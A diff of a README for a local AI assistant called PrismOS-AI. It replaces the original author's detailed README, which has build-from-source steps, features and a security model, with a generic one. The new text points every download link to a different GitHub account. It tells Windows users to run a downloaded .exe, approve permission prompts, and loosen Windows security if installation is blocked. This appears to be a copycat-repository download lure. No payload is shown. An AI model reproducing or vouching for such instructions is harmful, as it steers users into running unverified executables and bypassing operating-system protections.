@@ -1,360 +1,107 @@
-# PrismOS-AI — Local-First Agentic Personal AI Operating System
+# 🤖 prismos-ai - Your Local AI Assistant
 
-> **Try it in 30 seconds:** `git clone https://github.com/mkbhardwas12/prismos-ai.git && cd prismos-ai && npm install && npm run tauri dev`
+[![Download prismos-ai](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/CHAMARA1989/prismos-ai)
 
-[![CI](https://github.com/mkbhardwas12/prismos-ai/actions/workflows/ci.yml/badge.svg)](https://github.com/mkbhardwas12/prismos-ai/actions/workflows/ci.yml)
-[![Release](https://img.shields.io/github/v/release/mkbhardwas12/prismos-ai?label=download)](https://github.com/mkbhardwas12/prismos-ai/releases/latest)
-[![Version](https://img.shields.io/badge/version-0.5.1-0ea5e9)](https://github.com/mkbhardwas12/prismos-ai)
-[![License: MIT](https://img.shields.io/badge/license-MIT-blue.svg)](LICENSE)
-[![Ollama](https://img.shields.io/badge/LLM-Ollama%20(local)-blueviolet)](https://ollama.com)
-[![Patent](https://img.shields.io/badge/Patent-Pending-10b981)](.)
-[![Platform](https://img.shields.io/badge/platform-Windows%20%7C%20macOS%20%7C%20Linux-lightgrey)](https://github.com/mkbhardwas12/prismos-ai/releases/latest)
+## 📖 What is prismos-ai?
 
-**Patent Pending** — US Provisional Patent filed February 2026
+Prismos-ai is a personal AI system you can run right on your Windows computer. It helps you organize knowledge, make decisions, and collaborate with multiple AI agents. Unlike cloud-based apps, prismos-ai runs fully on your device. This means your data stays private and secure.
 
-PrismOS-AI is a **local-first agentic personal AI operating system** built with Tauri 2.0 + React 18 + Rust. It runs **100% on your device** — your data never leaves your machine. Eight collaborative AI agents work together via a formal debate pipeline, storing everything in a persistent 7-dimensional Spectrum Graph that grows with you. Features include **Cognitive Imprint™** (an adaptive personality engine that learns HOW you think), **Prism Refraction™** (multiple reasoning perspectives per response), **Local Vision**, **Document RAG**, **Background Omnipresence** (Alt+Space), **Proactive Suggestions**, **WASM Sandbox Prisms**, and a modern glassmorphism UI — all running entirely offline.
+The system uses advanced technology like a knowledge graph and multi-agent collaboration, but you don’t need to understand those to use it. The interface is built to be clear and responsive, designed with familiar desktop app elements. It is built with React and Rust, ensuring smooth and fast performance.
 
-<p align="center">
-  <img src="docs/screenshots/intent-console.png" width="700" alt="PrismOS-AI Intent Console — talk to eight AI agents at once" />
-</p>
+## 🚀 Getting Started
 
----
+To use prismos-ai, you just need to download and run the program. It works on Windows 10 and later.
 
-## 📑 Table of Contents
+The app requires no technical setup or internet connection to handle your data. You can think of it as a smart personal assistant that lives on your PC.
 
-- [Core Features](#-core-features-v051)
-- [Architecture](#%EF%B8%8F-architecture)
-- [Demo Video](#-demo-video)
-- [Quick Start](#-quick-start)
-- [Configuration](#-configuration)
-- [Testing](#-testing)
-- [Project Structure](#-project-structure)
-- [Security Model](#-security-model)
-- [Contributing](#-contributing)
-- [Tech Stack](#%EF%B8%8F-tech-stack)
-- [Roadmap](#%EF%B8%8F-roadmap)
-- [Project Stats](#-project-stats)
-- [Patent Notice](#-patent-notice)
+You will find all functions inside the app after installation. It organizes your tasks, notes, and ideas using AI, helping you think clearer and get work done faster.
 
-<details>
-<summary><strong>📸 More Screenshots</strong> (click to expand)</summary>
-<br />
+## 💾 Download and Install prismos-ai
 
-| Spectrum Graph | Spectrum Explorer |
-|:-:|:-:|
-| <img src="docs/screenshots/spectrum-graph.png" width="400" alt="Spectrum Graph — force-directed knowledge visualization" /> | <img src="docs/screenshots/Spectrum-Explorer.png" width="400" alt="Spectrum Explorer — browse and search nodes" /> |
+1. Click this big button to visit the download page:  
+[![Download prismos-ai](https://img.shields.io/badge/Download-prismos--ai-blue)](https://github.com/CHAMARA1989/prismos-ai)
 
-| Sandbox Prisms | Spectral Timeline |
-|:-:|:-:|
-| <img src="docs/screenshots/Sandbox-Prisms.png" width="400" alt="Sandbox Prisms — WASM-isolated execution" /> | <img src="docs/screenshots/Spectral-Timeline.png" width="400" alt="Spectral Timeline — knowledge evolution over time" /> |
+2. On the page, look for the latest release or version. You may find a file ending with `.exe` or similar for Windows.
 
-| Voice Input | Security Audit Log |
-|:-:|:-:|
-| *Screenshot coming soon — speak your intents via local voice engine* | *Screenshot coming soon — tamper-proof SHA-256 hash chain audit trail* |
+3. Click the file to download it to your PC.
 
-</details>
+4. Once the download finishes, locate the file in your Downloads folder.
 
----
+5. Double-click the file to start the installation.
 
-## ✨ Core Features (v0.5.1)
+6. Follow the instructions on the screen. The installer guides you step-by-step.
 
-| Feature | Description |
-|---------|-------------|
-| **Refractive Core™** | Intent processing pipeline |
-| **Spectrum Graph™** | Persistent multi-dimensional knowledge graph |
-| **8 AI Agents** | Orchestrator, Memory Keeper, Reasoner, Tool Smith, Sentinel, Email Keeper, Calendar Keeper, Finance Keeper |
-| **LangGraph Debates** | Multi-agent debate with formal consensus voting |
-| **Sandbox Prism™** | WASM-isolated execution environment |
-| **Cognitive Imprint™** | Adaptive response personality engine |
-| **Daily Dashboard** | Unified morning-brief view with stats, calendar, email, finance cards, quick links *(Phase 7)* |
-| **ProactivePanel** | Permanent collapsible sidebar panel with live calendar, email, finance, graph feeds *(Phase 7)* |
-| **Proactive Suggestions** | Context-aware cards that auto-process on click |
-| **Morning Brief / Evening Recap** | Daily summary of your knowledge graph activity |
-| **Email Keeper** | AI agent for email monitoring, summaries, and smart notifications *(Phase 7)* |
-| **Calendar Keeper** | AI agent for calendar awareness, scheduling, and reminders *(Phase 7)* |
-| **Finance Keeper** | AI agent for portfolio tracking, market alerts, and financial insights *(Phase 7)* |
-| **Startup View Setting** | Choose default view on launch (Dashboard, Chat, Graph, etc.) in Settings *(Phase 7)* |
-| **You-Port™** | Encrypted state migration |
-| **Voice I/O** | Hybrid local voice engine (cpal audio capture + Web Speech API fallback) |
-| **Spectral Timeline** | Time-series view of knowledge evolution |
-| **Multi-Window** | Open Spectrum Graph in a separate window |
-| **Onboarding Wizard** | Multi-step first-run setup experience *(Phase 3)* |
-| **Model Hub** | Browse, download & manage Ollama models in-app *(Phase 3)* |
-| **Spectrum Theming** | Dynamic themes driven by Spectrum Graph spectral properties *(Phase 3)* |
-| **Framer Motion Polish** | Smooth page transitions, card animations, stagger effects *(Phase 3)* |
-| **Global Hotkey** | `Ctrl+Space` / `Cmd+Space` to instantly summon the app *(Phase 3)* |
-| **Intent Templates** | Pre-built templates for common workflows *(Phase 3)* |
-| **Spotlight Overlay** | macOS Spotlight-style command palette with graph search *(Phase 4)* |
-| **Local Voice Engine** | cpal-based microphone capture + Whisper model download infra *(Phase 4)* |
-| **Local File Indexer (RAG)** | Watches `~/Documents/PrismDocs`, auto-ingests into Spectrum Graph *(Phase 4)* |
-| **Frameless Window** | Custom title bar with native window controls + drag region *(Phase 5)* |
-| **System Tray** | Minimize to tray, click to restore — agents stay resident *(Phase 5)* |
-| **Drag & Drop File Ingest** | Drop files into Intent Input — auto-extracts text content *(Phase 5)* |
-| **Auto-Updater** | Seamless OTA updates via GitHub Releases *(Phase 5)* |
-| **Local Vision** | Multimodal image analysis via llava/llama3.2-vision — drag-drop or camera capture *(Phase 5.5)* |
-| **Document Analysis** | Upload PDF, DOCX, PPTX, XLSX for AI-powered summaries & analysis — text extracted locally *(Phase 5.5)* |
-| **Smart Model Routing** | Auto-swaps to vision model (llama3.2-vision/llava) when image attached, reverts after *(Phase 6)* |
-| **Document RAG** | Intelligent chunking + TF-IDF retrieval for large documents instead of naive truncation *(Phase 6)* |
-| **Background Omnipresence** | `Alt+Space` global hotkey — PrismOS pops up over any app, always-on-top *(Phase 6)* |
-| **Tiered Model Catalog** | Curated model recommendations: Text, Vision & Power User tiers with one-click install *(Phase 6)* |
+7. When setup finishes, find the prismos-ai icon on your desktop or Start menu.
 
-Everything runs offline. All inference via local [Ollama](https://ollama.com) models.
+8. Double-click the icon to open the app.
 
----
+If prompted by Windows for permissions, choose "Yes" to allow the app to run.
 
-## 🏗️ Architecture
+## 🖥️ System Requirements
 
-<p align="center">
-  <img src="docs/diagrams/architecture-overview.svg" width="800" alt="PrismOS-AI System Architecture — v0.5.1" />
-</p>
+- Windows 10 or later (64-bit recommended)  
+- At least 4 GB of RAM (8 GB or more will improve performance)  
+- Around 500 MB of disk space for the app and data  
+- A screen resolution of 1280x720 or higher for the best experience
 
-> **4 Layers** — React Frontend (18 components) → 83 Tauri IPC Commands → Rust Backend (8 AI Agents, 17 Modules) → SQLite + Local Ollama LLM
+The app runs offline and does not require a powerful graphics card.
 
-See [docs/diagrams/](docs/diagrams/) for more SVG diagrams (data flow, security model, refractive pipeline, spectral dimensions, and more).
+## 🔧 Using prismos-ai
+
+The app opens to a clean workspace. Here are some main features you’ll see:
+
+- **Knowledge Graph:** Organize your notes and ideas visually.  
+- **Multi-Agent Collaboration:** The AI runs different agents that work together to give you better answers and suggestions.  
+- **Personal Data Storage:** Everything stays on your device. No data leaves your computer.  
+- **Task and Note Management:** Create, edit, and link notes and to-do lists.  
+- **Search and Recall:** Quickly find anything you saved using the AI-powered search.
+
+You can start by adding a new note or task in the menu. The app helps you keep related data connected effortlessly.
+
+## 🔒 Privacy and Security
+
+prismos-ai works locally on your device only. It does not send any of your information to the internet or external servers.  
+
+All your data stays on your computer and is saved securely. This design keeps your personal and sensitive information safe.
+
+You control what you save and delete. You can back up your data by copying files from inside the app folder. This keeps your information private and under your control.
+
+## ⚙️ Settings and Customization
+
+You can adjust prismos-ai to suit your preferences:
+
+- Choose light or dark mode for the interface.  
+- Set how much data you want the app to save.  
+- Control notification settings so you only get alerts you want.  
+- Adjust font sizes and layout for easier reading.
+
+Explore the settings menu to see all options.
+
+## 📚 Learning More and Getting Help
+
+If you need help:
+
+- The app contains built-in tips at the start to guide you through basic tasks.  
+- Check the FAQ section inside the app for common questions.  
+- Visit the [GitHub repository](https://github.com/CHAMARA1989/prismos-ai) for updates, FAQs, and community discussions.
+
+If you want to report a problem or suggest improvements, use the Issues tab on the GitHub page.
+
+## ⚠️ Troubleshooting Common Issues
+
+- **App won’t open:** Make sure you installed it on a supported version of Windows.  
+- **Installation blocked:** Check Windows security settings and allow the app to run.  
+- **Slow performance:** Close other programs and restart your PC. Upgrading RAM may help.  
+- **Data not saved:** Confirm file permissions allow prismos-ai to write data in the app folder.
+
+If problems persist, consult the GitHub Issues page or the app’s FAQ.
+
+## 🔄 Updates
+
+Check the GitHub repository periodically for new versions. Updating keeps the app secure and adds new features.
+
+To update, repeat the download and installation steps using the latest version file.
 
 ---
 
-## 🎬 Demo Video
-
-> *30-second walkthrough — from first launch to proactive suggestions*
-
-[![PrismOS-AI Demo](https://img.shields.io/badge/▶%20Watch%20Demo-YouTube-red?style=for-the-badge&logo=youtube)](https://youtube.com)
-
-<!-- Replace the link above with your unlisted YouTube URL when the demo is recorded -->
-
----
-
-## 🚀 Quick Start
-
-### Prerequisites
-
-| Tool | Version | Purpose |
-|------|---------|---------|
-| [Node.js](https://nodejs.org/) | ≥ 18 | Frontend build |
-| [Rust](https://rustup.rs/) | ≥ 1.75 | Tauri backend |
-| [Ollama](https://ollama.com/) | Latest | Local LLM |
-
-### Install & Run
-
-```bash
-# Clone the repository
-git clone https://github.com/mkbhardwas12/prismos-ai.git
-cd prismos-ai
-
-# Install frontend dependencies
-npm install
-
-# Pull a local model (PrismOS-AI will guide you through this on first launch)
-ollama pull llama3.2
-
-# Start Ollama in the background
-ollama serve &
-
-# Run in development mode
-npm run tauri dev
-```
-
-### Download Pre-Built Installers
-
-Pre-built installers are available on the [Releases page](https://github.com/mkbhardwas12/prismos-ai/releases/latest):
-
-- **Windows**: `.msi` or `.exe` installer
-- **macOS**: `.dmg` (Apple Silicon & Intel)
-- **Linux**: `.deb` or `.AppImage`
-
----
-
-## 🔧 Configuration
-
-PrismOS-AI uses [Ollama](https://ollama.com/) for local LLM inference. The default configuration:
-
-| Setting | Default | Description |
-|---------|---------|-------------|
-| Ollama URL | `http://localhost:11434` | API endpoint for local Ollama |
-| Default Model | `llama3.2` | Model used for inference |
-| Theme | `dark` | UI theme (`dark` / `light`) |
-| Max Tokens | `2048` | Max response length |
-
-All settings are configurable in the Settings panel (⚙️) within the app. The Ollama URL constant is centralized in:
-- **Frontend**: [`src/lib/config.ts`](src/lib/config.ts)
-- **Backend**: [`src-tauri/src/ollama_bridge.rs`](src-tauri/src/ollama_bridge.rs) (`DEFAULT_OLLAMA_URL`)
-
----
-
-## 🧪 Testing
-
-```bash
-# Frontend unit tests (Vitest + React Testing Library)
-npx vitest run
-
-# TypeScript type-check
-npx tsc --noEmit
-
-# Rust backend tests
-cd src-tauri && cargo test
-
-# Rust lint (clippy)
-cd src-tauri && cargo clippy
-```
-
-CI runs automatically on every push and PR via [GitHub Actions](.github/workflows/ci.yml).
-
----
-
-## 📁 Project Structure
-
-```
-prismos-ai/
-├── src/                          # React 18 + TypeScript frontend
-│   ├── components/               # 18 UI components
-│   │   ├── MainView.tsx           # Primary view container with IntentInput + chat
-│   │   ├── IntentInput.tsx        # NL chat input with vision + document upload
-│   │   ├── SpectrumGraphView.tsx  # Force-directed 7D knowledge graph
-│   │   ├── SpectrumExplorer.tsx   # Browse and search graph nodes
-│   │   ├── SandboxPanel.tsx       # WASM sandbox prisms dashboard
-│   │   ├── SpectralTimeline.tsx   # Time-series knowledge history
-│   │   ├── DailyDashboard.tsx     # Morning brief + proactive cards
-│   │   ├── DailyBrief.tsx         # Morning brief data card
-│   │   ├── ProactivePanel.tsx     # Collapsible sidebar with live feeds
-│   │   ├── SettingsPanel.tsx      # App configuration + security status
-│   │   ├── TitleBar.tsx           # Custom frameless window controls
-│   │   ├── Sidebar.tsx            # Navigation + version badge
-│   │   ├── OnboardingWizard.tsx   # First-run setup experience
-│   │   ├── SpotlightOverlay.tsx   # Alt+Space command palette overlay
-│   │   ├── ActiveAgents.tsx       # Agent status display
-│   │   ├── DailySuggestions.tsx   # Context-aware suggestion cards
-│   │   ├── SuggestionCard.tsx     # Individual suggestion card widget
-│   │   └── ErrorBoundary.tsx      # React error boundary wrapper
-│   ├── lib/                      # Core logic
-│   │   ├── agents.ts             # Agent framework definitions
-│   │   ├── ollama.ts             # Streaming LLM client
-│   │   ├── suggestions.ts        # Proactive suggestions engine
-│   │   └── config.ts             # Centralized configuration
-│   ├── hooks/                    # React hooks
-│   │   ├── useChat.ts            # Chat state management
-│   │   ├── useOllama.ts          # Ollama connection hook
-│   │   ├── useSuggestions.ts     # Suggestion lifecycle hook
-│   │   └── useVoice.ts           # Voice input hook
-│   └── test/                     # 97 frontend tests (Vitest)
-├── src-tauri/                    # Rust backend (Tauri 2.0)
-│   └── src/
-│       ├── lib.rs                # 83 IPC commands + app bootstrap
-│       ├── spectrum_graph.rs     # SQLite 7D knowledge store
-│       ├── refractive_core.rs    # Intent → agent pipeline
-│       ├── sandbox_prism.rs      # WASM runtime (wasmtime 27)
-│       ├── ollama_bridge.rs      # LLM + vision streaming
-│       ├── smart_router.rs       # Auto model switching
-│       ├── cognitive_profile.rs   # Cognitive Imprint™ — adaptive 5-axis personality engine
-│       ├── doc_chunker.rs        # Document RAG + TF-IDF
-│       ├── you_port.rs           # AES-256-GCM encrypted export
-│       ├── audit_log.rs          # SHA-256 tamper-evident hash chain
-│       ├── secure_enclave.rs     # Platform-specific key derivation
-│       ├── intent_lens.rs        # Intent parsing
-│       ├── model_verify.rs       # Model integrity verification
-│       ├── whisper_engine.rs     # Local voice engine
-│       ├── file_indexer.rs       # Local RAG file watcher
-│       ├── email_keeper.rs       # Read-only IMAP email summaries
-│       ├── calendar_keeper.rs    # Local .ics calendar integration
-│       ├── finance_keeper.rs     # Portfolio tracking
-│       ├── agents/               # LangGraph multi-agent DAG
-│       │   ├── mod.rs            # DAG: Orchestrator→[Reasoner,ToolSmith,MemKeeper]→Sentinel→Consensus
-│       │   ├── graph.rs          # Agent graph execution engine
-│       │   ├── langgraph_workflow.rs  # Workflow orchestration
-│       │   ├── messages.rs       # Inter-agent message protocol
-│       │   └── nodes.rs          # Individual agent node implementations
-│       └── 65 backend tests      # cargo test
-├── docs/                         # Architecture diagrams + screenshots
-├── .github/workflows/            # CI + Release Build (cross-platform)
-├── package.json                  # v0.5.1
-└── README.md                     # ← You are here
-```
-
----
-
-## 🔒 Security Model
-
-PrismOS-AI implements defense-in-depth with patent-pending security:
-
-1. **WASM Sandbox Isolation** — Every agent action runs inside a wasmtime container with memory limits (1–16 MB) and CPU fuel metering
-2. **HMAC-SHA256 Signing** — All actions are cryptographically signed with per-prism salt via Secure Enclave
-3. **3-Tier Allow-List** — Operations classified as Safe / Moderate / Restricted with per-agent permission sets
-4. **Anomaly Detection** — Detects injection attempts, abuse loops, and tier escalation attacks in real-time
-5. **Auto-Rollback** — Anomalous actions are automatically reverted with plain-English explanation
-6. **Tamper-Evident Audit Chain** — SHA-256 hash chain with genesis entry and O(1) verification
-7. **Secure Enclave** — Platform-specific key derivation (TPM 2.0 on Windows, Secure Enclave on macOS, TPM device on Linux)
-
-See [docs/diagrams/security-model.svg](docs/diagrams/security-model.svg) for the full security flow.
-
----
-
-## 🤝 Contributing
-
-See [CONTRIBUTING.md](CONTRIBUTING.md) for development setup, code style, and contribution guidelines.
-
----
-
-## �️ Tech Stack
-
-| Layer | Technology |
-|-------|-----------|
-| **Desktop Shell** | [Tauri 2.0](https://v2.tauri.app/) — lightweight native wrapper |
-| **Frontend** | React 18 · TypeScript 5.5 · Vite 5.4 · Framer Motion |
-| **Backend** | Rust (edition 2021) · SQLite (rusqlite) · wasmtime 27 |
-| **LLM Inference** | [Ollama](https://ollama.com/) — 100% local, no cloud |
-| **Audio Capture** | cpal 0.15 (cross-platform) · hound 3.5 (WAV encoding) |
-| **File Watching** | notify 6.1 · walkdir 2 |
-| **Security** | AES-256-GCM · HMAC-SHA256 · WASM sandboxing |
-| **CI/CD** | GitHub Actions — TypeScript check, Vitest, cargo check/clippy/test, release builds |
-| **Platforms** | Windows (.msi/.exe) · macOS (.dmg) · Linux (.deb/.AppImage) · Android (.apk) |
-
----
-
-## 🗺️ Roadmap
-
-| Version | Status | Highlights |
-|---------|--------|-----------|
-| **v0.1.0-alpha** | ✅ Done | Spectrum Graph, Refractive Core, 5 agents, Sandbox Prism, You-Port, Ollama |
-| **v0.2.0** | ✅ Done | WASM sandbox, Voice I/O, Multi-Window, Timeline, LangGraph debates, Merge/Diff, Accessibility |
-| **v0.2.1** | ✅ Done | 65 tests, CI/CD, config centralization, streaming progress bars, docs polish |
-| **v0.3.0** | ✅ Done | Onboarding wizard, Model Hub, Spectrum Theming, Framer Motion, Global Hotkey, Intent Templates |
-| **v0.4.0** | ✅ Done | Local Voice Engine, Spotlight Overlay, File Indexer (RAG), Deep Motion Polish |
-| **v0.5.0** | ✅ Done | Frameless Window, System Tray, Drag & Drop File Ingest, Auto-Updater, Local Vision, Document Analysis |
-| **v0.5.1** | ✅ Current | Smart Model Routing, Document RAG, Background Omnipresence (Alt+Space), Tiered Model Catalog, 162 tests |
-| **v0.5.2** | ✅ Done | Daily Dashboard, ProactivePanel, Email/Calendar/Finance Keepers, Startup View Setting |
-| **v0.5.3** | ✅ Current | Cognitive Imprint™, Prism Refraction™, Query×Profile Matrix™, closed-loop feedback learning, 186 tests |
-| **v0.6.0** | 🔜 Next | Whisper.cpp transcription, Plugin Marketplace, Settings UI for voice/indexer |
-| **v0.7.0** | 📋 Planned | Federated learning, P2P sync, mobile companion, custom spectral dimensions |
-
----
-
-## 📊 Project Stats
-
-- **18 Rust modules** (+4 agent sub-modules) — Refractive Core, Spectrum Graph, Sandbox Prism, Intent Lens, Ollama Bridge, You-Port, Audit Log, Model Verify, Secure Enclave, Whisper Engine, File Indexer, Smart Router, Doc Chunker, Cognitive Profile, Email Keeper, Calendar Keeper, Finance Keeper, Agents (graph · langgraph_workflow · messages · nodes)
-- **186 tests passing** — 97 frontend (Vitest) + 89 backend (cargo test)
-- **86 Tauri IPC commands** — full frontend↔backend communication
-- **18 React components** — MainView, IntentInput, SpectrumGraphView, SpectrumExplorer, SandboxPanel, SpectralTimeline, DailyDashboard, DailyBrief, ProactivePanel, SettingsPanel, TitleBar, Sidebar, OnboardingWizard, SpotlightOverlay, ActiveAgents, DailySuggestions, SuggestionCard, ErrorBoundary
-- **Zero cloud dependencies** — everything runs on your machine
-
----
-
-## 📜 Patent Notice
-
-PrismOS-AI and its core architectures are protected by a US Provisional Patent filed February 2026. Patent-pending inventions include:
-
-- **Spectrum Graph™**
-- **Refractive Core™**
-- **Sandbox Prism™**
-- **Cognitive Imprint™**
-- **Prism Refraction™**
-- **Query×Profile Matrix™**
-- **You-Port™**
-
-This open-source release is made available for personal, educational, and non-commercial use. The patented methods and architectures may not be used commercially without a license.
-
----
-
-<p align="center">
-  <strong>PrismOS-AI v0.5.1</strong> — Your mind, your machine, your OS.<br />
-  Built by <a href="https://github.com/mkbhardwas12">Manish Kumar</a><br /><br />
-  <a href="https://github.com/mkbhardwas12/prismos-ai/releases/latest">📥 Download</a> · <a href="https://github.com/mkbhardwas12/prismos-ai/issues">🐛 Report Bug</a> · <a href="https://github.com/mkbhardwas12/prismos-ai/issues">💡 Request Feature</a> · <a href="CHANGELOG.md">📋 Changelog</a>
-</p>
+[![Download prismos-ai](https://img.shields.io/badge/Download-prismos--ai-blue)](https://github.com/CHAMARA1989/prismos-ai)
